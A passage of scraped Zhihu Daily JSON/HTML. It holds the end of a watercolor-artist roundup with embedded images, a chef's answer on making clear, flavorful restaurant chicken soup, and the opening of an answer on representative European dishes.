src=\"https://pic3.zhimg.com/v2-666cb0ade098c6fd0741e9d60ffd491e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-9032f6f34b8d45c621aea97c352f5a9c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-17ccba0b7f1aa31d104a0a2ea782f3f2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e8c4205e8bfa8802f4b6010e7ba49a7f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-69d38a36ff35bf9c80b026535edbc5e8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>13.塞尔维亚画家 Endre Penovác 的生肖系列和猫咪（十幅）</strong></p>\n<p>Endre Penovác，出生于 1956 年，塞尔维亚水彩画家，这位画家的很多作品都是受到中国的水墨画影响而创作，下面是他每年为中国农历年绘制的生肖作品和他笔下的猫猫，我最喜欢的是他画的鸡，至于他画的狗嘛...只能说塞尔维亚的泰迪比较多吧....</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0b3608e26849168040c788a8dbc60b8a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-d0866b39b501e84ba83de1f18f7428d1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-214d6f80e8873202b00408ab8647ed01_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-5d7455af31076b60311f17a9497fbb6e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-c42020fa92b9788fe0b12ba8d5d85034_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-862f45a2b59c0e5cbcdab43cdd06df17_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-bf70f53904dfc416a7a47490f6233bd5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-2610024ba03cc8501ddb000d1466fa00_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-849f7a17b3dab74ad5767a604492fec6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-f04ffaf716db1e9e3770dfcb8ccd40cd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>四、静物类别：</strong><strong>14.Mark Adams 的水彩静物（十四幅）</strong></p>\n<p>Mark Adams（1925 - 2006），美国艺术家、设计师，以其简约克制的水彩作品闻名于世；</p>\n<p>简约的造型，干净的颜色，可每一幅都能让你流连忘返，这里面的内容可一点都不简单，每一幅画在提升画面效果的地方都细节拉满；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-e57954c568ca1dd6b937036b5302e400_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-e5bf61c0205cf95e08f571d329c07ad9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4186cf6bb1f8bf1a8b715bc447ab28c5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-9f3c347f5a0f450ebcbd7ec9e8fb61b1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-1cde2d1cb736e63d95d313daea595cae_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-962d510b55b1d0d18ba9c70eacfecedd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-931017c63d5248ab788893b3ada618e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-17ce21dd6db0ad1f09c0ad1fff2960ba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-788453c1d7d5f48e598877ca8c240eac_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a1c363056933d17ae8fc5592bb8c215a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-73f291c2fd1c29281c76cc995389b346_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-3acc17cb0f30def3f4979b71e1ad856f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-53c5142f97139d684c99fc49c796cf5e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9a29dfbfa4c7d4d7444db2913b96e958_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>15.韩国水彩画家申宗植 Shin Jong Sik 静物花卉水彩（四幅）</strong></p>\n<p>非常古典的造型，这位画家的很多作品都在网上有详细的作画过程视频，感兴趣的可以去看看；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a223d0dfc7f9bbd945d48c94a66b2e38_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ccc1e8041d843584ec4ce8386a0988a1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-05001b59925cca138fd90686404484fc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-537e42ef39a54fc1ee137335e56a1385_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>五、意象表现类别：</strong><strong>16.Joseph Mallord William Turner 灵动的笔触（八幅）</strong></p>\n<p>透纳的作品其实放上来我个人感觉有点犯规了，但作为艺术史上的璀璨星辰，透纳留下了近三万件水彩作品，不放上来一点实在是说不过去了，我挑了其中一类放上来，主要是通过笔触去展现透纳自己眼中的世界的作品；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-67fa02b26ac2de745d1cf27c750edd98_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8753b8cdd0f9ef887d950de1def61da6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b79df3350a70c7fadc087609eb54260e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-4c74fb99c66b23af18a2bf660004f07e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-536404c85ceca2219e58ed1035509d2b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-dfb57f069fc2f14824461402ff1af8c6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-603556a4203b8bf149e45791885f56b3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-eb0f99f8857866715b60ab58931ede87_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>17.印度画家 Prashant Prabhu 水彩作品（六幅）</strong></p>\n<p>用笔很克制，笔触拙朴、意境深远</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6b5b8f274a5a976c40c0b3e155aa5026_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-32eb8497cd6c4bb1ff3c8d462eadc3e2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-7a9d60e6583c98a97db39893fe633e8d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a01ab5f68e9e42d6f01ffd32cc2e9190_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-3bd9e0d4c8c738c5661c1a42d41f1ed2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4db39133460f8082a258d40728b1c128_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>18. Keith Nash 水彩作品（八幅）</strong></p>\n<p>他的画面就四样东西：天空、水面、飞鸟、行人，真乃落霞与孤鹜齐飞，秋水共长天一色；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c95af562b497e769c3561214609ac3d0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8b6c0ca75f4dc6bbcbab981092dc2f5a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-c3bb160c7b626b7738bc0c7abc69fbc3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-b4eeee10016c7d9337a5d84664334ae8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-261e13fffca2ea5998fa91284f22d80b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a02508f4ebfec834ab6ead796926d9b5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-9e2e3ee210403fefdedac8ca8ab87e21_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-55f739728f704c76d319e2bf8cb8e216_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>19.Joseph Zbukvic 的虚实之间（九幅）</strong></p>\n<p>之所以把 Joseph Zbukvic 归为意象派的原因是我从来就没觉得这位画家在写实，我认为他的水彩技法太熟练了，通过他的笔触我甚至能感受到他作画时的那股肆意妄为的快感，随心所欲却不逾矩，用娴熟的技法在真实和自己内心的意象之间找到了一个平衡点，境界之高，好得不得了；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c0e4ee2c35dc179cdd490047f3fe5f28_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ccdb7a89b358f590f53a8d6b166a13dd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-bc1bb078c9ea04da75a885c57cd61b5b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-003ced1b4973c1edbc0d9bec8b8e7e16_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e0288c8e371a471fe702df23d65a4514_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d63deb49a2650b58c6c49a34bb14fa79_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-6f3afe834750ea294c2e83bc37c9f844_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b4f939d49bafc34e09440adba02b2d92_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-902735084e0900d00eb8f8d85d856e2e_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>20.罗马尼亚水彩画家 Corneliu Dragan 的白色系（九幅）</strong></p>\n<p>以白色为主题的快写水彩，笔触洒脱，溶色老练，非常有画味，但个人觉得水平上比 Joseph Zbukvic 差一些；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-74eb2da682139e252b154dce2e80b422_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e7b1436edd70349d5c57970ab1feda74_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-787eba227440c5b64cdc5253aae9bfdb_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-7e6e242544a6cc4796ea6013765f9980_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-bbb9b08e8273b5781b4705aff18c867f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-6519933b4b6ed271f32058ef74f1cd37_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-5cd758346d8546c5233f569e1215244c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-6e9a07d8b950700fe7e8a0678c033f1e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-f6ee3b1cdcddba425dbd2506bded6d82_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>21.Samiran Sarkar 的晕染水彩（六幅）</strong></p>\n<p>他的作品有些中国水墨的味道在里面，奇怪的是，这位画家的资料我在中文网上很难查到，只知道这些作品是他画的；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-008bc59f05a7b51154613816c5abac8b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-b17a27ab945d9564fecc5922a0420241_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-19df6bbf7483824d847ec864c011bd1e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-fb5ad40ff7692b30e9730766032682a2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-297056ad3d3ed7564ad811737b94692f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-74e5e66f2df9b7849d7fbdb0ba6f4c5d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>22.塞尔维亚画家 Endre Penovác 的迷幻森林（九幅）</strong></p>\n<p>前面动物类别已经提到过这位画家了，Endre Penovác，出生于 1956 年，塞尔维亚水彩画家，这位画家的很多作品都是受到中国的水墨画影响而创作，</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-aa1669dc8a5e5931f3f3eac3f27da3d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-023fd309183cf777a8cd45e17d8806bc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8413d551c8143c440683fb4492e82737_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b01c72d00cff709079cdeaed9caf51c1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0156f76de02cdb7be737b8f772333642_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e623944ca68501bae1b40ada31c4cb12_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-c23e707507d9ff95a677dda1d3b9ae78_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e29fb352042bdb0dad6c1cbbf9c382f6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d64faf3db8e6e776d7a37a3df845c9fe_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>六、解构类别：</strong><strong>23.Adam Lister 的名作二次创作（九幅）</strong></p>\n<p>用水彩增加色块的质感和变化，将名画和流行元素画面给体块化和像素化，非常有意思的作品；</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ac201bc7c0471c4de76cecad4a38bad4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ab967d22a1131d7692825554ff71c1b4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-37abe01bcbfdf0f338482a3c94ebd069_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-6082d31c0b749909fb716e53c553ff02_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-eaa8474d70440b0dce97c5a1af78eda5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-ebbf11da23dc4bd5e7956a9bd45a1c1c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b4dded77659b8fb1faa2f3fdd67a80c9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-78a06fee81904de4bfc16214ebcd105c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a9775d37157fab93d6e02a09d7938b06_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>24.波兰水彩画家 Maja Wronska 的水彩城市画（三幅）</strong></p>\n<p>流光溢彩，城市的复杂在画家眼里被解构成冷暖两色，在我看来，画中的冷色寓意着钢筋水泥和社会冷冰冰的机械感，暖色寓意着人的温度和情感，是人使得城市变得温暖；</p>\n<figure><img src=\"https://pica.zhimg.com/v2-dfe36fa76e0027a498d968a1045405fa_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-c4c4a1e9b093a2afb471fc4fa865b877_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-451d9d4bb114f410eac73f860adbb974_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>七、最后一辑，中国水彩画名家特辑：</strong><strong>25.汪钰元的江南水乡（十幅）</strong></p>\n<p>汪钰元，1943 年生于苏州，毕业于苏州工艺美术专科学校 。中国美术家协会会员、中国水彩画家学会会员。</p>\n<p>诗情画意，在他的作品中我能感受到他吸收消化了吴冠中的美学元素；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f58d6c698a62f469097fd2f98f9a5459_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b0442f8ff53deb223528f3eb5b2d19dd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-7b647c205e14a00a7a19dd2654b41fe1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-f6d489f73b53fb0abd0dd488831fc942_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-6be967cfca2a791348eaea93dafdcf98_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-9bb1290d79560373d659d7df64286953_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-86ee941a86d937a49465846fa964ceec_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-2f8af421b536f2f3c98506511f892a4f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-1c79a36b33c7c11df994c786a39fa1c7_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b297cc5af990b880b1b90af5d987d373_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>26.于建涛的写实水彩（八幅）</strong></p>\n<p>1968 年生，辽宁省大连市人，现定居北京。职业水彩画画家，辽宁省美术家协会会员，大连市美术协会会员。</p>\n<p>一位非常精通写实的风景水彩画家；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1676a4bc59fbfab97280b8efef1976d1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8a2ef305368d950697a550ca8e2e1a7c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-9d27e1004c2c59d2ab72d101fabf22f6_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0e5a3215d2e4281bd27cd55a2577e0bf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-336bc8b0608fc5b8fccb85bee4e7de0a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-89e37821a7ccc0a66c2dbd2b5b84d348_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-b5fff6e90aa792b46242fd422eb5c878_720w.jpg?source=8673f162\" alt=\"\"></figure><hr>\n<p>最近我把我这几年在知乎写的一点关于绘画、艺术的干货做了个汇总，大家有需求的欢迎去看看。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/98208948\">Scotty：连点绘面：近年来写的绘画、艺术干货汇总 持续更新</a></p>\n<p><strong>以上</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/28238234\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738948"},{"title":"为什么饭店里的鸡汤很清，而且还特别的好喝？","date":"2021-08-06 23:06:41","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d66828fc624b5cc447479317afe64b24_l.jpg?source=8673f162\"><span>藏在暗处的X先生，</span><span>讲点干货/公众号：大刘的饭堂/微信：lxh664027519</span>\n<a href=\"https://www.zhihu.com/question/437783371/answer/1673991481\" hidden>阅读原文</a>\n</div>\n<div>\n<p>首先表明职业身份，我是一名粤菜厨师。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b6eb69c9018246fb0cfe85b0f8294fe6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>准备婚宴中</figcaption></figure><p>看到有其他答主说“鸡汤要清澈，油脂就要少”这句话，我可以很负责任的说，鸡汤清澈与否，与鸡本身的油脂并无任何关系。</p>\n<p>并且很有意思的一点是，想要让鸡汤好喝，则少不了油脂的功劳。</p>\n<p>按下鸡汤如何清澈不表，先讲讲为什么饭店的鸡汤很好喝。</p>\n<p>（肯定又会有人说了，无非就是味精味精味精，还有各种添加剂，如果是这样想的，看到这里就可以出去了，也不需要在评论区写下你的高见，因为你绞尽脑汁写的几行字，我连看都不会看，并且会在几秒钟内完成删除拉黑等一系列动作。）</p>\n<p>饭店里炖鸡汤，除了老鸡之外，还需要配上其他的肉类，来填补味道上的空缺。</p>\n<p>如果只是用鸡来炖，在口感上会感觉到很“薄”。</p>\n<p>饭店里最基础的一个炖鸡汤的肉类搭配，除了老鸡，还会有凤爪（鸡爪），赤肉（瘦肉）和龙骨（猪脊骨）。</p>\n<p>凤爪的作用，用来增加鸡汤的胶质感，不至于成汤后仍然像水一样稀稀拉拉。</p>\n<p>赤肉与龙骨，则是增加汤中的肉香，让口感上变“醇厚”。</p>\n<p>而家庭里制作，大多是一只鸡，再扔进去两片姜，这样出来的味道，自然是比不过饭店里用多种肉类混合做出来的味道。</p>\n<p>对于“鸡”的处理，如果去除了鸡身上一些带油脂的地方，则会大大减少鸡汤中鸡的鲜味。</p>\n<p>炖出来的鸡汤，汤面上有油和汤面上无油，两者会有很大的味道上的差距。</p>\n<p>但是鸡汤表面的油总不可能和汤一起喝下去，自然是要想办法去除。所以在粤菜厨房里，“吹汤”是负责炖汤的“上什（za）”部门中人人都要会的基本技能：汤盅捧起，略微向前倾斜，将表面的油脂吹出去。</p>\n<p>这样，即可以在煲汤的过程中保留了鸡的鲜味，也可以在成汤后很好的去除掉表面上的油脂。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-9593e64e9d44eb6ebac6b06e9a6f5376_720w.jpg?source=8673f162\" alt=\"\"><figcaption>炖好的汤底成品</figcaption></figure><p>说完了如何让鸡汤好喝，再来说一说如何让鸡汤很清。</p>\n<p>其实饭店里的鸡汤，并不是用明火煲，更多的是用蒸箱隔水炖，两者在味道上出来的效果相同。</p>\n<p>但明火煲的话，肉会随着水的沸腾而出现很多碎渣，并且随着水的动作“上下翻飞”，煲出来的效果，就是远看清澈，但近看之下，就会有很多细小的碎渣子在汤中飘舞，破坏了整道汤的形象。</p>\n<p>所以我在家中做的时候，也常常选用隔水炖的方法，除了成品效果好之外，也比较省心，不需要看火，只需要在蒸锅里加足量的水，定好时间即可。</p>\n<p>如果比较偏爱明火煲汤的话，那就要格外注意火的大小，在煲的过程中，要让水处在“似开未开”的状态，如果不注意火的大小而让水一直沸腾的话，那么很快就会得到一锅白色的浓汤……</p>\n<p>明火煲出来之后，又不想有许多碎渣子影响外观，那么可以用密漏过滤一遍，没有密漏的话，也可以用茶袋或者是煲汤袋、纱布等隔渣过滤。</p>\n<p>还有一种会使鸡汤混浊的原因，那便是肉本身的血水和杂质。所以需要提前对肉进行飞水，而飞水也是有一些讲究。</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1332334239329402880\" target=\"_blank\"><img src=\"https://pic1.zhimg.com/v2-4c6ab2be92bd739dbb790b5c2a3a6fdc.jpeg\" alt=\"\"><span><span>上什部门炖汤前的飞水与分量工作<span></span><span></span></span><span><span></span>https://www.zhihu.com/video/1332334239329402880</span></span></a></p>\n<p>还是以前文的几种肉类搭配为例。</p>\n<p>凤爪与龙骨，需要冷水下锅，彻底的焯透，这两者中，有大量的血沫。焯不干净的话，一是会使汤混浊，二是很容易使汤变质发臭。</p>\n<p>而老鸡和赤肉，则是需要水开后再下入，目地是为了去除表面所附着的血沫和杂质。如果老鸡和赤肉也同样冷水下锅彻底从内而外焯透的话，则会损失大量的风味物质。</p>\n<p>只有注意到这些细节，才会使炖出来的汤既好喝，又清澈。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c4b693940fb5493e348eb83f6b1681e6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>清汤菜胆炖鱼翅</figcaption></figure><hr>\n<p><a href=\"https://www.zhihu.com/answer/1886768332\">藏在暗处的 X 先生：有哪些把凉拌菜做得好吃的秘诀？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1727796404\">藏在暗处的 X 先生：2021 年春节，你家的年夜饭都有啥？哪道菜你吃得最香？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1725884545\">藏在暗处的 X 先生：家里老人说「有鸡才算过年」，过年吃鸡都有哪些讲究？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1708704537\">藏在暗处的 X 先生：炒肉为什么会粘锅脱浆?</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/260890882\">麻婆豆腐的姐妹——麻辣豆腐</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1505847004\">藏在暗处的 X 先生：味精毁了中国的美食吗？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1503510223\">藏在暗处的 X 先生：你做出过什么特别费时，但却十分好吃的美食？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1488688770\">藏在暗处的 X 先生：有哪些很重要又被忽视的炒菜技巧？</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/260896038\">开胃小菜——玫瑰萝卜</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1499796005\">藏在暗处的 X 先生：为什么现在做菜基本都把食材的味道去掉了？</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1507719658\">藏在暗处的 X 先生：以更低的价钱吃到肉有什么办法?</a></p>\n<p><a href=\"https://www.zhihu.com/answer/1546164145\">藏在暗处的 X 先生：美食作家王刚售卖 299 的铁锅跟市场卖 30 块的有什么区别？</a><a href=\"https://zhuanlan.zhihu.com/p/260885213\">干烧鲈鱼——附煎鱼不破皮的方法</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/437783371\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738950"},{"title":"欧洲各国的代表美食有哪些？","date":"2021-08-06 23:06:34","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/49717949/answer/2012234797\" hidden>阅读原文</a>\n</div>\n<div>\n<p>*.欧洲国家大大小小，一些大国的代表性食物有不少，比如德国就可以举出香肠、酸菜、大肘子、啤酒、蝴蝶脆饼等，更不用说意大利、法国了，而一些小国，本身就没几个人。这里按照公平原则，一个国家出一个代表，大国可能会有些吃亏。</p>\n<p>*.这里所说的欧洲，范围比地理上的欧洲略广，大致相当于参加欧洲杯预选赛的那些国家。</p>\n<p><strong>东地中海</strong></p>\n<p>地中海东部沿岸，是古典时代最发达、最富庶的地区之一。这些地区从罗马时代到奥斯曼帝国时代，大多数时间处于同一个政权统治之下，地理环境相似，饮食也有很多相似之处。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0099498e3061b0e3448cc2dc6e01d0a3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>东地中海之希腊菜，Gyros 卷饼、烤肉、抓饭、豆泥、葡萄酒及其他</figcaption></figure><p>地中海饮食的特点是以小麦为主食，习惯以橄榄油烹饪，并以葡萄酒佐餐。当地饮食受中东和中亚饮食影响，爱吃酸奶（通常带点咸味）、抓饭和烤肉，起源于罗马时代的果仁蜜饼，以及类似的坚果类甜点在东地中海以及高加索、中东等地非常流行。</p>\n<p><strong>土耳其</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-383126801319772d989a8d0fddeb8dcf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>土耳其软糖</figcaption></figure><p>土耳其位于欧亚交界之地，是个饮食文化丰富的国度。土耳其软糖（Lokum）以淀粉和砂糖制作，加入蔷薇水、乳香、柠檬、坚果等调味。类似的软糖最初来自于伊朗或阿拉伯地区，18 世纪后在奥斯曼帝国发扬光大，并传入希腊、巴尔干和东欧各地。</p>\n<p><strong>希腊</strong></p>\n<figure><img 